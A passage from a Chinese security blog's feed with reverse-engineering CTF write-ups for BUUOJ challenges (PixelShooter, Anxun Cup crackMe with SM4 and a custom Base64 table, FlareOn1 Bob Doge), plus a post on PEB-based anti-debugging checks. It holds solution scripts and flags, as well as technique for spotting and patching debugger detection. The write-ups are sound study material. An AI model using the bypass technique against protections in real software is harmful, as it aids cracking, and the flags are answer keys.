class="line">write.close()</span><br><span class="line">os.system(<span class="string">&quot;python3 data_re.py&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p><strong>flag{b0Nf|Re_LiT!}</strong></p></blockquote><hr /><h1 id="mrctf2020pixelshooter"><a class="markdownIt-Anchor" href="#mrctf2020pixelshooter"></a> [MRCTF2020]PixelShooter</h1><p>链接: <a href="https://buuoj.cn/challenges#%5BMRCTF2020%5DPixelShooter">https://buuoj.cn/challenges#[MRCTF2020]PixelShooter</a></p><p>Android</p><p>貌似是用了U3D, 改成zip解压, 找到<code>Assembly-CSharp.dll</code><br />在IDA里看字符串就行</p><blockquote><p><strong>flag{Unity_1S_Fun_233}</strong></p></blockquote><hr /><h1 id="安洵杯-2019crackme"><a class="markdownIt-Anchor" href="#安洵杯-2019crackme"></a> [安洵杯 2019]crackMe</h1><p>链接: <a href="https://buuoj.cn/challenges#%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5DcrackMe">https://buuoj.cn/challenges#[安洵杯 2019]crackMe</a></p><p>EXE 32</p><p>IDA中 <strong>_main_0</strong> 函数反编译结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main_0</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> (__cdecl *v3)(_DWORD *); <span class="comment">// [esp-4h] [ebp-D0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please Input the flag:\n&quot;</span>);</span><br><span class="line">  scanf_s(<span class="string">&quot;%s&quot;</span>, &amp;unk_41A1E4);</span><br><span class="line">  MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;Exception&quot;</span>, <span class="string">L&quot;Warning&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v3 = sub_41100F;</span><br><span class="line">  MEMORY[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  sub_411136(HIWORD(v3));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行的时候回弹一个&quot;hooked&quot;的窗口<br />动调发现函数<code>MessageBoxW</code>被hook到了<code>sub_412AB0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">sub_412AB0</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+D8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; j_strlen(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[i] &lt;= <span class="number">122</span> &amp;&amp; Str[i] &gt;= <span class="number">97</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Str[i] -= <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( Str[i] &lt;= <span class="number">90</span> &amp;&amp; Str[i] &gt;= <span class="number">65</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Str[i] += <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  MessageBoxA(<span class="number">0</span>, <span class="string">&quot;hooked&quot;</span>, <span class="string">&quot;successed&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  AddVectoredExceptionHandler(<span class="number">0</span>, Handler);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做了一个VEH的异常处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">Handler_0</span><span class="params">(_DWORD **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">20</span>]; <span class="comment">// [esp+D0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( **a1 == <span class="number">-1073741819</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    qmemcpy(v2, <span class="string">&quot;where_are_u_now?&quot;</span>, <span class="number">16</span>);</span><br><span class="line">    sub_411172(&amp;unk_41A218, v2);</span><br><span class="line">    SetUnhandledExceptionFilter(TopLevelExceptionFilter);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VEH异常处理又套了一个SEH异常处理<br />运行完函数<code>sub_41100F</code>之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov dword ptr [eax], 1</span><br></pre></td></tr></table></figure><p>这条语句会触发异常<br />从而进入VEH的异常处理函数</p><p>理一遍顺序</p><ul><li>Base64表内容变换</li><li>函数<code>sub_411172</code>使用SM4加密输入内容(搜一下<code>0xA3B1BAC6</code>)</li><li>Str2顺序变换</li><li>函数<code>sub_4110FF</code>变换Base64表顺序</li><li>Str2与Base64编码结果比较</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pysm4</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&quot;1UTAOIkpyOSWGv/mOYFY4R!!&quot;</span></span><br><span class="line">cipher_list = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> cipher ]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_list), <span class="number">2</span>): <span class="comment"># 换位</span></span><br><span class="line">  cipher_list[_] = cipher[_+<span class="number">1</span>]</span><br><span class="line">  cipher_list[_+<span class="number">1</span>] = cipher[_]</span><br><span class="line">cipher = <span class="string">&quot;&quot;</span>.join(cipher_list).replace(<span class="string">&quot;!&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">base64_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span> </span><br><span class="line">base64_table_re = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> base64_table]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(base64_table_re)): <span class="comment"># 换Base64表</span></span><br><span class="line">  <span class="keyword">if</span> <span class="number">97</span> &lt;= <span class="built_in">ord</span>(base64_table[(_+<span class="number">24</span>)%<span class="number">64</span>]) &lt;= <span class="number">122</span>:</span><br><span class="line">    base64_table_re[_] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(base64_table[(_+<span class="number">24</span>)%<span class="number">64</span>])-<span class="number">32</span>)</span><br><span class="line">  <span class="keyword">elif</span> <span class="number">65</span> &lt;= <span class="built_in">ord</span>(base64_table[(_+<span class="number">24</span>)%<span class="number">64</span>]) &lt;= <span class="number">90</span>:</span><br><span class="line">    base64_table_re[_] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(base64_table[(_+<span class="number">24</span>)%<span class="number">64</span>])+<span class="number">32</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    base64_table_re[_] = base64_table[(_+<span class="number">24</span>)%<span class="number">64</span>]</span><br><span class="line">base64_table_re = <span class="string">&quot;&quot;</span>.join(base64_table_re)</span><br><span class="line"></span><br><span class="line">cipher_list = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> cipher]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)): <span class="comment"># Base64换表解码</span></span><br><span class="line">  cipher_list[_] = base64_table[base64_table_re.index(cipher[_])]</span><br><span class="line">cipher = <span class="string">&quot;&quot;</span>.join(cipher_list)</span><br><span class="line">cipher = base64.b64decode(cipher+<span class="string">&quot;==&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;where_are_u_now?&quot;</span> <span class="comment"># SM4解密</span></span><br><span class="line">flag = pysm4.decrypt(<span class="built_in">int</span>(binascii.hexlify(cipher).decode(), <span class="number">16</span>), (<span class="built_in">int</span>(binascii.hexlify(key).decode(), <span class="number">16</span>)))</span><br><span class="line">print(binascii.unhexlify(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:].encode()))</span><br></pre></td></tr></table></figure><blockquote><p><strong>flag{SM4foRExcepioN?!}</strong></p></blockquote><hr /><h1 id="flareon1bob-doge"><a class="markdownIt-Anchor" href="#flareon1bob-doge"></a> [FlareOn1]Bob Doge</h1><p>链接: <a href="https://buuoj.cn/challenges#%5BFlareOn1%5DBob%20Doge">https://buuoj.cn/challenges#[FlareOn1]Bob Doge</a></p><p>EXE 64</p><p>下载下来是一个安装程序<br />得到<code>Challenge1.exe</code><br />丢进dnspy64<br />在函数<code>btnDecode_Click</code>里打断点看字符串<br />可以看到flag</p><blockquote><p><strong>flag{3rmahg3rd.b0b.d0ge@flare-on.com}</strong></p></blockquote><hr /><p>EOF</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;随缘刷题&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Reverse" scheme="https://yoloyolo.top/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Reverse_PEB</title>
    <link href="https://yoloyolo.top/2021/05/24/Reverse-PEB/"/>
    <id>https://yoloyolo.top/2021/05/24/Reverse-PEB/</id>
    <published>2021-05-24T23:13:45.000Z</published>
    <updated>2021-05-24T12:40:53.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://buuoj.cn/challenges#crackMe">https://buuoj.cn/challenges#crackMe</a></p><p>关于这道题目的反调试知识</p><a id="more"></a><p>PEB结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">+0x000 InheritedAddressSpace : UChar</span><br><span class="line">+0x001 ReadImageFileExecOptions : UChar</span><br><span class="line">+0x002 BeingDebugged    : UChar</span><br><span class="line">+0x003 SpareBool        : UChar</span><br><span class="line">+0x004 Mutant           : Ptr32 Void</span><br><span class="line">+0x008 ImageBaseAddress : Ptr32 Void</span><br><span class="line">+0x00c Ldr              : Ptr32 _PEB_LDR_DATA</span><br><span class="line">+0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">+0x014 SubSystemData    : Ptr32 Void</span><br><span class="line">+0x018 ProcessHeap      : Ptr32 Void</span><br><span class="line">+0x01c FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION</span><br><span class="line">+0x020 FastPebLockRoutine : Ptr32 Void</span><br><span class="line">+0x024 FastPebUnlockRoutine : Ptr32 Void</span><br><span class="line">+0x028 EnvironmentUpdateCount : Uint4B</span><br><span class="line">+0x02c KernelCallbackTable : Ptr32 Void</span><br><span class="line">+0x030 SystemReserved   : [1] Uint4B</span><br><span class="line">+0x034 AtlThunkSListPtr32 : Uint4B</span><br><span class="line">+0x038 FreeList         : Ptr32 _PEB_FREE_BLOCK</span><br><span class="line">+0x03c TlsExpansionCounter : Uint4B</span><br><span class="line">+0x040 TlsBitmap        : Ptr32 Void</span><br><span class="line">+0x044 TlsBitmapBits    : [2] Uint4B</span><br><span class="line">+0x04c ReadOnlySharedMemoryBase : Ptr32 Void</span><br><span class="line">+0x050 ReadOnlySharedMemoryHeap : Ptr32 Void</span><br><span class="line">+0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void</span><br><span class="line">+0x058 AnsiCodePageData : Ptr32 Void</span><br><span class="line">+0x05c OemCodePageData  : Ptr32 Void</span><br><span class="line">+0x060 UnicodeCaseTableData : Ptr32 Void</span><br><span class="line">+0x064 NumberOfProcessors : Uint4B</span><br><span class="line">+0x068 NtGlobalFlag     : Uint4B</span><br><span class="line">+0x070 CriticalSectionTimeout : _LARGE_INTEGER</span><br><span class="line">+0x078 HeapSegmentReserve : Uint4B</span><br><span class="line">+0x07c HeapSegmentCommit : Uint4B</span><br><span class="line">+0x080 HeapDeCommitTotalFreeThreshold : Uint4B</span><br><span class="line">+0x084 HeapDeCommitFreeBlockThreshold : Uint4B</span><br><span class="line">+0x088 NumberOfHeaps    : Uint4B</span><br><span class="line">+0x08c MaximumNumberOfHeaps : Uint4B</span><br><span class="line">+0x090 ProcessHeaps     : Ptr32 Ptr32 Void</span><br><span class="line">+0x094 GdiSharedHandleTable : Ptr32 Void</span><br><span class="line">+0x098 ProcessStarterHelper : Ptr32 Void</span><br><span class="line">+0x09c GdiDCAttributeList : Uint4B</span><br><span class="line">+0x0a0 LoaderLock       : Ptr32 Void</span><br><span class="line">+0x0a4 OSMajorVersion   : Uint4B</span><br><span class="line">+0x0a8 OSMinorVersion   : Uint4B</span><br><span class="line">+0x0ac OSBuildNumber    : Uint2B</span><br><span class="line">+0x0ae OSCSDVersion     : Uint2B</span><br><span class="line">+0x0b0 OSPlatformId     : Uint4B</span><br><span class="line">+0x0b4 ImageSubsystem   : Uint4B</span><br><span class="line">+0x0b8 ImageSubsystemMajorVersion : Uint4B</span><br><span class="line">+0x0bc ImageSubsystemMinorVersion : Uint4B</span><br><span class="line">+0x0c0 ImageProcessAffinityMask : Uint4B</span><br><span class="line">+0x0c4 GdiHandleBuffer  : [34] Uint4B</span><br><span class="line">+0x14c PostProcessInitRoutine : Ptr32     void </span><br><span class="line">+0x150 TlsExpansionBitmap : Ptr32 Void</span><br><span class="line">+0x154 TlsExpansionBitmapBits : [32] Uint4B</span><br><span class="line">+0x1d4 SessionId        : Uint4B</span><br><span class="line">+0x1d8 AppCompatFlags   : _ULARGE_INTEGER</span><br><span class="line">+0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER_ULARGE_INTEGER</span><br><span class="line">+0x1e8 pShimData        : Ptr32 Void</span><br><span class="line">+0x1ec AppCompatInfo    : Ptr32 Void</span><br><span class="line">+0x1f0 CSDVersion       : _UNICODE_STRING</span><br><span class="line">+0x1f8 ActivationContextData : Ptr32 Void</span><br><span class="line">+0x1fc ProcessAssemblyStorageMap : Ptr32 Void</span><br><span class="line">+0x200 SystemDefaultActivationContextData : Ptr32 Void</span><br><span class="line">+0x204 SystemAssemblyStorageMap : Ptr32 Void</span><br><span class="line">+0x208 MinimumStackCommit : Uint4B</span><br></pre></td></tr></table></figure><p>IDA中反编译的结果以及对于PEB结构体的定义描述与真实情况有些出入, 需要以汇编代码为准</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *((_DWORD *)NtCurrentPeb()-&gt;ProcessHeap + <span class="number">0x0C</span>) != <span class="number">2</span> )</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:004015D4                 mov     eax, large fs:30h</span><br><span class="line">.text:004015DA                 mov     eax, [eax+18h]</span><br><span class="line">.text:004015DD                 mov     eax, [eax+0Ch]</span><br><span class="line">.text:004015E0                 cmp     eax, 2</span><br><span class="line">.text:004015E3                 jz      short loc_401628</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *((_DWORD *)NtCurrentPeb()-&gt;ProcessHeap + <span class="number">0x0C</span>) != <span class="number">2</span> )</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00401985                 mov     eax, large fs:30h</span><br><span class="line">.text:0040198B                 mov     eax, [eax+18h]</span><br><span class="line">.text:0040198E                 mov     eax, [eax+0Ch]</span><br><span class="line">.text:00401991                 cmp     eax, 2</span><br><span class="line">.text:00401994                 jz      short loc_4019A2</span><br></pre></td></tr></table></figure><p>HEAP结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+0×000 Entry:_HEAP_ENTRY</span><br><span class="line">+0×008 Signature:Uint4B</span><br><span class="line">+0×00c Flags:Uint4B</span><br><span class="line">+0×010 ForceFlags:Uint4B</span><br><span class="line">+0×014 VirtualMemoryThreshold :Uint4B</span><br><span class="line">+0×018 SegmentReserve:Uint4B</span><br><span class="line">+0×01c SegmentCommit:Uint4B</span><br><span class="line">+0×020 DeCommitFreeBlockThreshold :Uint4B</span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ((<span class="keyword">int</span>)NtCurrentPeb()-&gt;NtGlobalFlag &amp; <span class="number">0x70</span>) != <span class="number">0</span> )</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00401ADA                 mov     eax, large fs:30h</span><br><span class="line">.text:00401AE0                 mov     eax, [eax+68h]</span><br><span class="line">.text:00401AE3                 and     eax, 70h</span><br><span class="line">.text:00401AE6                 test    eax, eax</span><br><span class="line">.text:00401AE8                 jz      short loc_401B00</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)*(_DWORD *)&amp;NtCurrentPeb()-&gt;BeingDebugged )</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00401B4D                 mov     eax, large fs:30h</span><br><span class="line">.text:00401B53                 inc     eax</span><br><span class="line">.text:00401B54                 inc     eax</span><br><span class="line">.text:00401B55                 mov     eax, [eax]</span><br><span class="line">.text:00401B57                 and     eax, 0FFh</span><br><span class="line">.text:00401B5C                 test    eax, eax</span><br><span class="line">.text:00401B5E                 jz      short loc_401B6E</span><br></pre></td></tr></table></figure><p>当程序被调试时, 以上if语句均<strong>可能</strong>成立, 从而对程序的流程产生影响</p><p><s>所以基本看到PEB出现NOP就完事了</s></p><blockquote><p>《逆向工程核心原理》 Page.529</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://buuoj.cn/challenges#crackMe&quot;&gt;https://buuoj.cn/challenges#crackMe&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;关于这道题目的反调试知识&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Reverse" scheme="https://yoloyolo.top/tags/Reverse/"/>
    
    <category term="PEB" scheme="https://yoloyolo.top/tags/PEB/"/>
    
    <category term="Anti-Debug" scheme="https://yoloyolo.top/tags/Anti-Debug/"/>
    
  </entry>
  
</feed>
